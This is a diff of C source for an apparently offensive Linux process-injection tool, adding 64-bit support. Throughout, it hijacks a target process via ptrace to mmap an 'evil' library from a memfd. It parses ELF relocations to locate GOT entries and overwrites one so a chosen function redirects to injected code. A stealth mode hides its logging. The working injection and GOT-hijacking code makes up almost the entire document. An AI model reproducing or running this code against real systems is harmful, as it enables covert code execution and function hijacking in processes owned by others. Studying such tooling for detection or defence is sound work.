 	if (!ae_is_address_mapped(pid, string_addr, str_len) || string_addr < stack_limit) {
 		ae_log(AE_LOG_ERROR, "Calculated string address too low: 0x%lx", string_addr);
@@ -997,14 +1149,24 @@ ae_mmap_library (int pid,
 		return -1;
 	}
 
-	// open the memfd path so we can mmap it
-	// hijack open syscall to open /proc/self/fd/memfd
+	/* open the memfd path so we can mmap it
+	 * hijack open syscall to open /proc/self/fd/memfd */
 	if (!ae_stealth_mode)
 		ae_log(AE_LOG_DEBUG, "Opening memfd path: %s", library_string);
+
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	/* 64-bit: open(pathname, flags, mode) → rdi, rsi, rdx */
+	reg.rax = SYS_open;
+	reg.rdi = (unsigned long long)string_addr;
+	reg.rsi = 0;  /* O_RDONLY */
+	reg.rdx = 0;
+	reg.rip = sysenter;
+#else
 	reg.eax = SYS_open;
 	reg.ebx = (long)string_addr;
 	reg.ecx = 0;  
 	reg.eip = sysenter;
+#endif
 
 	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
 		ae_log(AE_LOG_ERROR, "Failed to set registers for open: %s", strerror(errno));
@@ -1012,7 +1174,7 @@ ae_mmap_library (int pid,
 	}
 
 	fd = -1;
-	unsigned int open_result;
+	uintptr_t open_result;
 	if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
 	                                SINGLESTEP_TIMEOUT_SEC, "open(memfd)", SYS_open, &open_result) == 0) {
 		fd = (int)open_result;
@@ -1027,20 +1189,34 @@ ae_mmap_library (int pid,
 
 	offset = (string_addr + str_len) + 8;
 
+	/* mmap(addr, length, prot, flags, fd, offset) for text segment */
+	size_t text_len = segs->segs[TYPE_TEXT].len + (PAGE_SIZE - (segs->segs[TYPE_TEXT].len & (PAGE_SIZE - 1)));
+	off_t text_off = segs->segs[TYPE_TEXT].offset & ~(PAGE_SIZE - 1);
+
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	/* 64-bit: args in registers directly */
+	reg.rax = SYS_mmap;
+	reg.rdi = 0;                   /* addr = NULL */
+	reg.rsi = text_len;            /* length */
+	reg.rdx = 5;                   /* prot = PROT_READ | PROT_EXEC */
+	reg.r10 = 2;                   /* flags = MAP_SHARED */
+	reg.r8 = fd;                   /* fd */
+	reg.r9 = text_off;             /* offset */
+	reg.rip = sysenter;
+#else
 	reg.eip = sysenter;
 	reg.eax = SYS_mmap;
 	reg.ebx = offset;
 
-	// mmap args on stack: addr size prot flags fd offset
-	// mmap takes 6 args so we put them on the stack and point ebx to that
+	/* mmap args on stack: addr size prot flags fd offset
+	 * mmap takes 6 args so we put them on the stack and point ebx to that */
 	ptrace(PTRACE_POKETEXT, pid, offset, 0);
-	ptrace(PTRACE_POKETEXT, pid, offset + 4,
-		   segs->segs[TYPE_TEXT].len + (PAGE_SIZE - (segs->segs[TYPE_TEXT].len & (PAGE_SIZE - 1))));
-	ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);  // PROT_READ | PROT_EXEC
-	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);  // MAP_SHARED
+	ptrace(PTRACE_POKETEXT, pid, offset + 4, text_len);
+	ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);  /* PROT_READ | PROT_EXEC */
+	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);  /* MAP_SHARED */
 	ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);
-	ptrace(PTRACE_POKETEXT, pid, offset + 20,
-           segs->segs[TYPE_TEXT].offset & ~(PAGE_SIZE - 1));
+	ptrace(PTRACE_POKETEXT, pid, offset + 20, text_off);
+#endif
 
 	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
 		ae_log(AE_LOG_ERROR, "Failed to set registers for mmap: %s", strerror(errno));
@@ -1048,18 +1224,17 @@ ae_mmap_library (int pid,
 	}
 
 	if (!ae_stealth_mode)
-		ae_log(AE_LOG_DEBUG, "Executing mmap for text segment (size: %zu)",
-		       segs->segs[TYPE_TEXT].len + (PAGE_SIZE - (segs->segs[TYPE_TEXT].len & (PAGE_SIZE - 1))));
+		ae_log(AE_LOG_DEBUG, "Executing mmap for text segment (size: %zu)", text_len);
 	*evilbase = 0;
-	unsigned int mmap_result;
+	uintptr_t mmap_result;
 	if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
 	                                SINGLESTEP_TIMEOUT_SEC, "mmap(text)", SYS_mmap, &mmap_result) == 0) {
-		if (mmap_result != (unsigned int)-1) {
+		if (mmap_result != (uintptr_t)-1) {
 			*evilbase = mmap_result;
 			if (!ae_stealth_mode)
 				ae_log(AE_LOG_DEBUG, "mmap(text) completed: base=0x%lx", *evilbase);
 		} else {
-			ae_log(AE_LOG_ERROR, "mmap(text) failed: result=0x%x", mmap_result);
+			ae_log(AE_LOG_ERROR, "mmap(text) failed: result=0x%lx", (unsigned long)mmap_result);
 		}
 	}
 	
@@ -1068,16 +1243,31 @@ ae_mmap_library (int pid,
 		return -1;
 	}
 
+	/* mmap for data segment */
+	size_t data_len = segs->segs[TYPE_DATA].len + (PAGE_SIZE - (segs->segs[TYPE_DATA].len & (PAGE_SIZE - 1)));
+	off_t data_off = segs->segs[TYPE_DATA].offset & ~(PAGE_SIZE - 1);
+
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	reg.rax = SYS_mmap;
+	reg.rdi = 0;                   /* addr = NULL */
+	reg.rsi = data_len;            /* length */
+	reg.rdx = 3;                   /* prot = PROT_READ | PROT_WRITE */
+	reg.r10 = 2;                   /* flags = MAP_SHARED */
+	reg.r8 = fd;                   /* fd */
+	reg.r9 = data_off;             /* offset */
+	reg.rip = sysenter;
+#else
 	reg.eip = sysenter;
 	reg.eax = SYS_mmap;
 	reg.ebx = offset;
 
 	ptrace(PTRACE_POKETEXT, pid, offset, 0);
-	ptrace(PTRACE_POKETEXT, pid, offset + 4, segs->segs[TYPE_DATA].len + (PAGE_SIZE - (segs->segs[TYPE_DATA].len & (PAGE_SIZE - 1))));
-	ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);
+	ptrace(PTRACE_POKETEXT, pid, offset + 4, data_len);
+	ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);  /* PROT_READ | PROT_WRITE */
 	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);
 	ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);
-	ptrace(PTRACE_POKETEXT, pid, offset + 20, segs->segs[TYPE_DATA].offset & ~(PAGE_SIZE - 1));
+	ptrace(PTRACE_POKETEXT, pid, offset + 20, data_off);
+#endif
 
 	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
 		ae_log(AE_LOG_ERROR, "Failed to set registers for data mmap: %s", strerror(errno));
@@ -1085,13 +1275,12 @@ ae_mmap_library (int pid,
 	}
 
 	if (!ae_stealth_mode)
-		ae_log(AE_LOG_DEBUG, "Executing mmap for data segment (size: %zu)",
-		       segs->segs[TYPE_DATA].len + (PAGE_SIZE - (segs->segs[TYPE_DATA].len & (PAGE_SIZE - 1))));
-	unsigned int mmap_data_result;
+		ae_log(AE_LOG_DEBUG, "Executing mmap for data segment (size: %zu)", data_len);
+	uintptr_t mmap_data_result;
 	if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
 	                                SINGLESTEP_TIMEOUT_SEC, "mmap(data)", SYS_mmap, &mmap_data_result) == 0) {
 		if (!ae_stealth_mode)
-			ae_log(AE_LOG_DEBUG, "mmap(data) completed: result=0x%x", mmap_data_result);
+			ae_log(AE_LOG_DEBUG, "mmap(data) completed: result=0x%lx", (unsigned long)mmap_data_result);
 	} else {
 		ae_log(AE_LOG_ERROR, "mmap(data) failed or timed out");
 	}
@@ -1100,12 +1289,24 @@ ae_mmap_library (int pid,
 		ae_log(AE_LOG_DEBUG, "Restoring stack");
 	ae_ptrace_cpy_to(string_addr, (ulong_t*)orig_ds, str_len + 32, pid);
 
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	reg.rip = orig_rip;
+	reg.rax = orig_rax;
+	reg.rdi = orig_rdi;
+	reg.rsi = orig_rsi;
+	reg.rdx = orig_rdx;
+	reg.r10 = orig_r10;
+	reg.r8 = orig_r8;
+	reg.r9 = orig_r9;
+	reg.rsp = orig_rsp;
+#else
 	reg.eip = eip;
 	reg.eax = eax;
 	reg.ebx = ebx;
 	reg.ecx = ecx;
 	reg.edx = edx;
 	reg.esp = esp;
+#endif
 
 	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
 	
@@ -1120,32 +1321,92 @@ ae_mmap_library (int pid,
 }
 
 
-// parse ELF relocations to find GOT entries for functions we want to hijack
-// this shit is diabolical im so fucking sorry
-// if youre reading this ive failed you
-// parses ELF file finds dynamic symbol table and relocation entries matches them up to get GOT offsets
+/* parses ELF file finds dynamic symbol table and relocation entries matches them up to get GOT offsets */
 static struct ae_sym_info * 
 ae_get_plt (uchar_t * mem) 
 {
+	char * symname = NULL;
+	int i, j, k, symcount = 0;
+	struct ae_sym_info * sinfo = NULL;
+
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	Elf64_Ehdr *ehdr;
+	Elf64_Shdr *shdr, *shdrp, *strtab;
+	Elf64_Sym *syms, *symsp;
+	Elf64_Rela *rela;
+
+	ehdr = (Elf64_Ehdr*)mem;
+	shdr = (Elf64_Shdr*)(mem + ehdr->e_shoff);
+	shdrp = shdr;
+
+	/* find the dynamic symbol table section */
+	for (i = 0; i < ehdr->e_shnum; i++, shdrp++) {
+		if (shdrp->sh_type == SHT_DYNSYM) {
+			strtab = &shdr[shdrp->sh_link];
+
+			if ((symname = malloc(strtab->sh_size)) == NULL)
+				return NULL;
+
+			memcpy(symname, mem + strtab->sh_offset, strtab->sh_size);
+
+			if ((syms = (Elf64_Sym *)malloc(shdrp->sh_size)) == NULL)
+				return NULL;
+
+			memcpy((Elf64_Sym*)syms, (Elf64_Sym*)(mem + shdrp->sh_offset), shdrp->sh_size);
+
+			symsp = syms;
+			symcount = shdrp->sh_size / sizeof(Elf64_Sym);
+
+			sinfo = (struct ae_sym_info*)malloc(sizeof(struct ae_sym_info) + sizeof(struct ae_sym)*symcount);
+
+			if (!sinfo) {
+				ae_log(AE_LOG_ERROR, "Could not allocate symbol info");
+				return NULL;
+			}
+
+			sinfo->count = symcount;
+
+			for (j = 0; j < symcount; j++) {
+				strncpy(sinfo->syms[j].name, &symname[symsp[j].st_name], MAXBUF);
+				sinfo->syms[j].index = j;
+				sinfo->syms[j].offset = 0;
+			}
+
+			free(symname);
+			free(syms);
+			break;
+		}
+	}
+
+	/* 64-bit uses RELA (with addend) and R_X86_64_JUMP_SLOT */
+	shdr = (Elf64_Shdr*)(mem + ehdr->e_shoff);
+	for (i = 0; i < ehdr->e_shnum; i++, shdr++) {
+		if (shdr->sh_type == SHT_RELA) {
+			rela = (Elf64_Rela*)(mem + shdr->sh_offset);
+			for (j = 0; (size_t)j < shdr->sh_size / sizeof(Elf64_Rela); j++, rela++) {
+				if (ELF64_R_TYPE(rela->r_info) == R_X86_64_JUMP_SLOT) {
+					for (k = 0; k < symcount; k++) {
+						if (ELF64_R_SYM(rela->r_info) == (unsigned int)sinfo->syms[k].index)
+							sinfo->syms[k].offset = rela->r_offset;
+					}
+				}
+			}
+		}
+	}
+
+#else /* 32-bit */
 	Elf32_Ehdr *ehdr;
 	Elf32_Shdr *shdr, *shdrp, *strtab;
 	Elf32_Sym *syms, *symsp;
 	Elf32_Rel *rel;
 
-	char * symname = NULL;
-	int i, j, k, symcount;
-
-	struct ae_sym_info * sinfo = NULL;
-
 	ehdr = (Elf32_Ehdr*)mem;
 	shdr = (Elf32_Shdr*)(mem + ehdr->e_shoff);
-
 	shdrp = shdr;
 
-	// find the dynamic symbol table section
+	/* find the dynamic symbol table section */
 	for (i = 0; i < ehdr->e_shnum; i++, shdrp++) {
 		if (shdrp->sh_type == SHT_DYNSYM) {
-			// get the string table that goes with this symbol table
 			strtab = &shdr[shdrp->sh_link];
 
 			if ((symname = malloc(strtab->sh_size)) == NULL)
@@ -1159,7 +1420,6 @@ ae_get_plt (uchar_t * mem)
 			memcpy((Elf32_Sym*)syms, (Elf32_Sym*)(mem + shdrp->sh_offset), shdrp->sh_size);
 
 			symsp = syms;
-
 			symcount = shdrp->sh_size / sizeof(Elf32_Sym);
 
 			sinfo = (struct ae_sym_info*)malloc(sizeof(struct ae_sym_info) + sizeof(struct ae_sym)*symcount);
@@ -1183,17 +1443,16 @@ ae_get_plt (uchar_t * mem)
 		}
 	}
 
-	// match up relocations with symbols to find GOT offsets
-	// go through all relocation sections and find JUMP_SLOT relocations which are GOT entries
+	/* match up relocations with symbols to find GOT offsets
+	 * go through all relocation sections and find JUMP_SLOT relocations which are GOT entries */
 	for (i = 0; i < ehdr->e_shnum; i++, shdr++) {
 		if (shdr->sh_type == SHT_REL || shdr->sh_type == SHT_RELA) {
 			if (shdr->sh_type == SHT_REL) {
 				rel = (Elf32_Rel*)(mem + shdr->sh_offset);
-				for (j = 0; j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++) {
-					// JUMP_SLOT relocations are PLT entries which use GOT
+				for (j = 0; (size_t)j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++) {
 					if (ELF32_R_TYPE(rel->r_info) == R_386_JMP_SLOT) {
 						for (k = 0; k < symcount; k++) {
-							if (ELF32_R_SYM(rel->r_info) == sinfo->syms[k].index)
+							if (ELF32_R_SYM(rel->r_info) == (unsigned int)sinfo->syms[k].index)
 								sinfo->syms[k].offset = rel->r_offset;
 						}
 					}
@@ -1203,6 +1462,7 @@ ae_get_plt (uchar_t * mem)
 			}
 		}
 	}
+#endif
 
 	int valid_count = 0;
 	for (i = 0; i < symcount; i++) {
@@ -1250,27 +1510,77 @@ ae_get_evil_lib_size (int pid, char * libname)
 }
 
 
-// find function address by parsing ELF symbol table from library file
-// burn the whole repo start over
+/* find function address by parsing ELF symbol table from library file */
 static ulong_t
 ae_find_function_by_symbol (char * libname, ulong_t vaddr, ulong_t text_file_offset, ulong_t text_vaddr)
 {
 	uchar_t * lib_data = NULL;
 	size_t lib_size = 0;
-	Elf32_Ehdr *ehdr;
-	Elf32_Phdr *phdr;
-	Elf32_Shdr *shdr, *symtab_shdr = NULL, *strtab_shdr = NULL;
-	Elf32_Sym *syms;
 	char *strtab;
 	ulong_t func_addr = 0;
+	
+	(void)text_file_offset;  /* suppress unused warning */
 	
 	lib_data = ae_read_library_file(libname, &lib_size);
 	if (!lib_data) {
 		ae_log(AE_LOG_ERROR, "Failed to read library file for symbol lookup");
 		return 0;
 	}
+
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)lib_data;
+	Elf64_Phdr *phdr;
+	Elf64_Shdr *shdr, *symtab_shdr = NULL, *strtab_shdr = NULL;
+	Elf64_Sym *syms;
 	
-	ehdr = (Elf32_Ehdr *)lib_data;
+	if (text_vaddr == 0) {
+		phdr = (Elf64_Phdr *)(lib_data + ehdr->e_phoff);
+		for (int i = 0; i < ehdr->e_phnum; i++, phdr++) {
+			if (phdr->p_type == PT_LOAD && phdr->p_flags == (PF_X | PF_R)) {
+				text_vaddr = phdr->p_vaddr;
+				break;
+			}
+		}
+	}
+	
+	shdr = (Elf64_Shdr *)(lib_data + ehdr->e_shoff);
+	for (int i = 0; i < ehdr->e_shnum; i++) {
+		if (shdr[i].sh_type == SHT_SYMTAB || shdr[i].sh_type == SHT_DYNSYM) {
+			symtab_shdr = &shdr[i];
+			strtab_shdr = &shdr[symtab_shdr->sh_link];
+			break;
+		}
+	}
+	
+	if (!symtab_shdr || !strtab_shdr) {
+		ae_log(AE_LOG_ERROR, "Could not find symbol table in library");
+		free(lib_data);
+		return 0;
+	}
+	
+	syms = (Elf64_Sym *)(lib_data + symtab_shdr->sh_offset);
+	strtab = (char *)(lib_data + strtab_shdr->sh_offset);
+	
+	int num_syms = symtab_shdr->sh_size / sizeof(Elf64_Sym);
+	for (int i = 0; i < num_syms; i++) {
+		if (ELF64_ST_TYPE(syms[i].st_info) == STT_FUNC && syms[i].st_name != 0) {
+			char *sym_name = strtab + syms[i].st_name;
+			if (strcmp(sym_name, "ae_evilprint") == 0) {
+				ulong_t symbol_vaddr = syms[i].st_value;
+				ulong_t offset_from_text_base = symbol_vaddr - text_vaddr;
+				func_addr = vaddr + offset_from_text_base;
+				if (!ae_stealth_mode)
+					ae_log(AE_LOG_DEBUG, "Found ae_evilprint: symbol_vaddr=0x%lx, text_vaddr=0x%lx, offset=0x%lx, final_addr=0x%lx", 
+					       symbol_vaddr, text_vaddr, offset_from_text_base, func_addr);
+				break;
+			}
+		}
+	}
+#else /* 32-bit */
+	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)lib_data;
+	Elf32_Phdr *phdr;
+	Elf32_Shdr *shdr, *symtab_shdr = NULL, *strtab_shdr = NULL;
+	Elf32_Sym *syms;
 	
 	if (text_vaddr == 0) {
 		phdr = (Elf32_Phdr *)(lib_data + ehdr->e_phoff);
@@ -1315,12 +1625,13 @@ ae_find_function_by_symbol (char * libname, ulong_t vaddr, ulong_t text_file_off
 			}
 		}
 	}
+#endif
 	
 	free(lib_data);
 	return func_addr;
 }
 
-// search for evil function by byte signature matching
+
 // i have no fucking idea why this fixed it but it did
 static ulong_t
 ae_search_evil_lib (int pid, char * libname, ulong_t vaddr, size_t text_seg_size)
@@ -1456,40 +1767,37 @@ ae_evil_lib_present (char * lib, int pid)
 }
 
 
-// FUCK YEAH IT WORKS AND IT AINT STUPID
-// patch GOT entry to point to our evil function instead of original
-// i am actually a genius and nobody can tell me otherwise
-// finds the GOT entry for the function we want to hijack and overwrites it with our evil function address
-static Elf32_Addr
+/* finds the GOT entry for the function we want to hijack and overwrites it with our evil function address */
+static uintptr_t
 ae_patch_got (struct ae_opts * opt, struct ae_sym_info * sinfo, ulong_t lib_base, ulong_t patch_val, bool is_pie)
 {
-	Elf32_Addr ret = 0;
-	Elf32_Addr got_offset;
+	uintptr_t ret = 0;
+	uintptr_t got_offset;
 	
-	// find the symbol we want to hijack
+	/* find the symbol we want to hijack */
 	for (int i = 0; i < sinfo->count; i++) {
 		if (strcmp(sinfo->syms[i].name, opt->func) == 0 && sinfo->syms[i].offset != 0) {
 
 			if (!opt->stealth) {
 				ae_log(AE_LOG_DEBUG, "Found string <%s> to patch", sinfo->syms[i].name);
-				ae_log(AE_LOG_DEBUG, "Symbol offset: 0x%x, lib_base: 0x%lx, ae_text_base: 0x%lx, ae_text_base_original: 0x%lx",
-					   sinfo->syms[i].offset, lib_base, ae_text_base, ae_text_base_original);
+				ae_log(AE_LOG_DEBUG, "Symbol offset: 0x%lx, lib_base: 0x%lx, ae_text_base: 0x%lx, ae_text_base_original: 0x%lx",
+					   (unsigned long)sinfo->syms[i].offset, lib_base, ae_text_base, ae_text_base_original);
 			}
 
-			// PIE binaries need base address adjustment fuck PIE
+			/* PIE binaries need base address adjustment */
 			if (is_pie) {
 				got_offset = (lib_base + (sinfo->syms[i].offset - ae_text_base_original));
 				if (!opt->stealth)
-					ae_log(AE_LOG_DEBUG, "PIE GOT calculation: lib_base(0x%lx) + (offset(0x%x) - ae_text_base_original(0x%lx)) = 0x%lx",
-						   lib_base, sinfo->syms[i].offset, ae_text_base_original, got_offset);
+					ae_log(AE_LOG_DEBUG, "PIE GOT calculation: lib_base(0x%lx) + (offset(0x%lx) - ae_text_base_original(0x%lx)) = 0x%lx",
+						   lib_base, (unsigned long)sinfo->syms[i].offset, ae_text_base_original, (unsigned long)got_offset);
 			} else {
 				got_offset = sinfo->syms[i].offset;
 			}
 
 			if (!opt->stealth)
-				ae_log(AE_LOG_DEBUG, "Calculated GOT offset: 0x%lx", got_offset);
+				ae_log(AE_LOG_DEBUG, "Calculated GOT offset: 0x%lx", (unsigned long)got_offset);
 
-			// save the original function address before we overwrite it
+			/* save the original function address before we overwrite it */
 			ae_original = (ulong_t)ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
 			if (!opt->stealth)
 				ae_log(AE_LOG_DEBUG, "Original GOT value: 0x%lx", ae_original);
@@ -1498,18 +1806,18 @@ ae_patch_got (struct ae_opts * opt, struct ae_sym_info * sinfo, ulong_t lib_base
 				ae_log(AE_LOG_ERROR, "GOT entry is 0 - function may not be resolved yet (lazy binding)");
 			}
 
-			// overwrite GOT entry with our evil function address
+			/* overwrite GOT entry with our evil function address */
 			ptrace(PTRACE_POKETEXT, opt->pid, got_offset, patch_val);
-			ret = ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
+			ret = (uintptr_t)ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
 
 			if (!opt->stealth)
-				ae_log(AE_LOG_DEBUG, "New GOT value: 0x%x", ret);
+				ae_log(AE_LOG_DEBUG, "New GOT value: 0x%lx", (unsigned long)ret);
 			
 			if (ret != patch_val) {
-				ae_log(AE_LOG_ERROR, "GOT patch verification failed: expected 0x%lx, got 0x%x", patch_val, ret);
+				ae_log(AE_LOG_ERROR, "GOT patch verification failed: expected 0x%lx, got 0x%lx", patch_val, (unsigned long)ret);
 			} else if (!opt->stealth) {
 				ae_log(AE_LOG_DEBUG, "GOT patch verified successfully");
-				ulong_t verify = ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
+				ulong_t verify = (ulong_t)ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
 				if (verify != patch_val) {
 					ae_log(AE_LOG_ERROR, "GOT value changed after patching! Expected 0x%lx, got 0x%lx", patch_val, verify);
 				}
@@ -1523,9 +1831,9 @@ ae_patch_got (struct ae_opts * opt, struct ae_sym_info * sinfo, ulong_t lib_base
 		ae_log(AE_LOG_DEBUG, "Symbol <%s> not found in %d symbols with relocations", opt->func, sinfo->count);
 		ae_log(AE_LOG_DEBUG, "Available symbols with GOT entries:");
 		int shown = 0;
-		for (int i = 0; i < sinfo->count && shown < 10; i++) {  // Show first 10 symbols with offsets
+		for (int i = 0; i < sinfo->count && shown < 10; i++) {
 			if (sinfo->syms[i].offset != 0) {
-				ae_log(AE_LOG_DEBUG, "  %s (offset: 0x%x)", sinfo->syms[i].name, sinfo->syms[i].offset);
+				ae_log(AE_LOG_DEBUG, "  %s (offset: 0x%lx)", sinfo->syms[i].name, (unsigned long)sinfo->syms[i].offset);
 				shown++;
 			}
 		}
@@ -1549,6 +1857,7 @@ ae_print_banner (void)
 	fprintf(stderr, "   Memory-Only Process Injection      \n");
 	fprintf(stderr, "\n");
 }
+// the design is so cool right
 
 
 static void
@@ -1624,7 +1933,7 @@ ae_parse_args (int argc, char ** argv, struct ae_opts * opt)
 }
 
 
-// code works logic questionable but hey bro it works vibes are high
+// idk
 static char * 
 ae_map_binary (int pid)
 {
@@ -1677,20 +1986,32 @@ ae_map_binary (int pid)
 
 
 static bool
-ae_good_elf (Elf32_Ehdr * ehdr, struct ae_opts * opt)
+ae_good_elf (void * ehdr_ptr, struct ae_opts * opt)
 {
-	if (!(ehdr->e_ident[EI_MAG0] == ELFMAG0 &&
- 		  ehdr->e_ident[EI_MAG1] == ELFMAG1 &&
-		  ehdr->e_ident[EI_MAG2] == ELFMAG2 &&
-		  ehdr->e_ident[EI_MAG3] == ELFMAG3)) {
+	(void)opt;  /* suppress unused warning */
+	unsigned char *e_ident = (unsigned char *)ehdr_ptr;
+	
+	if (!(e_ident[EI_MAG0] == ELFMAG0 &&
+ 		  e_ident[EI_MAG1] == ELFMAG1 &&
+		  e_ident[EI_MAG2] == ELFMAG2 &&
+		  e_ident[EI_MAG3] == ELFMAG3)) {
 		ae_log(AE_LOG_ERROR, "Binary is not an ELF executable");
 		return false;
 	}
 
-	if (ehdr->e_ident[EI_CLASS] != ELFCLASS32) {
-		ae_log(AE_LOG_ERROR, "Only 32-bit ELF executables are supported");
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	if (e_ident[EI_CLASS] != ELFCLASS64) {
+		ae_log(AE_LOG_ERROR, "Only 64-bit ELF executables are supported on 64-bit build");
 		return false;
 	}
+	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)ehdr_ptr;
+#else
+	if (e_ident[EI_CLASS] != ELFCLASS32) {
+		ae_log(AE_LOG_ERROR, "Only 32-bit ELF executables are supported on 32-bit build");
+		return false;
+	}
+	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)ehdr_ptr;
+#endif
 
 	if (!(ehdr->e_type == ET_EXEC || ehdr->e_type == ET_DYN)) {
 		ae_log(AE_LOG_ERROR, "Only executable binaries are supported");
@@ -1702,30 +2023,38 @@ ae_good_elf (Elf32_Ehdr * ehdr, struct ae_opts * opt)
 
 
 static inline bool 
-ae_binary_is_pie (Elf32_Ehdr * ehdr)
+ae_binary_is_pie (void * ehdr_ptr)
 {
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)ehdr_ptr;
+#else
+	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)ehdr_ptr;
+#endif
 	return (ehdr->e_type == ET_DYN);
 }
 
 
 static void
-ae_parse_headers (Elf32_Ehdr * ehdr, struct ae_segments * segs)
+ae_parse_headers (void * ehdr_ptr, struct ae_segments * segs)
 {
-	Elf32_Phdr * phdr = (Elf32_Phdr*)((char*)ehdr + ehdr->e_phoff);
 	int i;
+
+#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
+	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)ehdr_ptr;
+	Elf64_Phdr * phdr = (Elf64_Phdr*)((char*)ehdr + ehdr->e_phoff);
 
 	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
 		if (phdr->p_type == PT_LOAD) { 
-			// .text
+			/* .text */
 			if (phdr->p_flags == (PF_X | PF_R)) {
 				segs->segs[TYPE_TEXT].base   = phdr->p_vaddr;
 				ae_text_base = phdr->p_vaddr;
-				ae_text_base_original = phdr->p_vaddr;  /* Save original for GOT calculations */
+				ae_text_base_original = phdr->p_vaddr;
 				segs->segs[TYPE_TEXT].offset = phdr->p_offset;
 				segs->segs[TYPE_TEXT].len    = phdr->p_filesz;
 			}
 
-			// .data
+			/* .data */
 			if (phdr->p_flags == (PF_W | PF_R)) {
 				segs->segs[TYPE_DATA].base   = phdr->p_vaddr;
 				ae_data_base = phdr->p_vaddr;
@@ -1734,6 +2063,31 @@ ae_parse_headers (Elf32_Ehdr * ehdr, struct ae_segments * segs)
 			}
 		}
 	}
+#else
+	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)ehdr_ptr;
+	Elf32_Phdr * phdr = (Elf32_Phdr*)((char*)ehdr + ehdr->e_phoff);
+
+	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
+		if (phdr->p_type == PT_LOAD) { 
+			/* .text */
+			if (phdr->p_flags == (PF_X | PF_R)) {
+				segs->segs[TYPE_TEXT].base   = phdr->p_vaddr;
+				ae_text_base = phdr->p_vaddr;
+				ae_text_base_original = phdr->p_vaddr;
+				segs->segs[TYPE_TEXT].offset = phdr->p_offset;
+				segs->segs[TYPE_TEXT].len    = phdr->p_filesz;
+			}
+
+			/* .data */
+			if (phdr->p_flags == (PF_W | PF_R)) {
+				segs->segs[TYPE_DATA].base   = phdr->p_vaddr;
+				ae_data_base = phdr->p_vaddr;
+				segs->segs[TYPE_DATA].offset = phdr->p_offset;
+				segs->segs[TYPE_DATA].len    = phdr->p_filesz;
+			}
+		}
+	}
+#endif
 }
 
 
@@ -1777,8 +2131,8 @@ ae_inject_lib (struct ae_opts * opt, ulong_t * evilbase, struct ae_segments * se
 }
 
 
-/* Get actual load address for PIE binaries from /proc/pid/maps */
-/* Returns the base address (first mapping with offset 0 that belongs to the executable) */
+// got tired of these coments yet cuz i am 
+/* returns the base address (first mapping with offset 0 that belongs to the executable) */
 static ulong_t
 ae_get_pie_base(int pid)
 {
@@ -1793,32 +2147,31 @@ ae_get_pie_base(int pid)
 	if (!f)
 		return 0;
 
-	/* Find the first mapping with offset 0 that belongs to the main executable */
-	/* Format: start-end perms offset dev inode pathname */
-	/* Example: 56574000-56575000 r--p 00000000 08:50 1679 /tmp/ae_daemon */
+	/* find the first mapping with offset 0 that belongs to the main executable */
+	/* example: 56574000-56575000 r--p 00000000 08:50 1679 /tmp/ae_daemon */
 	while (fgets(line, sizeof(line), f)) {
 		/* Parse using sscanf - pathname is optional and may have leading spaces */
 		if (sscanf(line, "%lx-%lx %7s %15s %15s %31s %511[^\n]", 
 		           &start, &end, perms, offset, dev, inode, pathname) >= 6) {
-			/* Check if offset is 0 */
+			/* ceck if offset is 0 */
 			if (strcmp(offset, "00000000") == 0) {
-				/* Check if it's a real file path (not [heap], [stack], [vdso], etc.) */
-				/* Skip leading spaces in pathname */
+				/* check if it's a real file path (not [heap], [stack], [vdso], etc.) */
+				/* skip leading spaces in pathname */
 				char *p = pathname;
 				while (*p == ' ' || *p == '\t') p++;
     
 				if (*p != '\0' && *p != '[') {
-					/* This is the first mapping of the main executable */
+					/* rhis is the first mapping of the main executable */
 					base = start;
 					break;
 				}
 			}
 		} else {
-			/* Try parsing without pathname (some mappings don't have one) */
+			/* try parsing without pathname (some mappings don't have one) */
 			if (sscanf(line, "%lx-%lx %7s %15s %15s %31s", 
 			           &start, &end, perms, offset, dev, inode) >= 5) {
 				if (strcmp(offset, "00000000") == 0) {
-					/* No pathname means it's likely a special region, skip */
+					/* skip if no pathname */
 					continue;
 				}
 			}
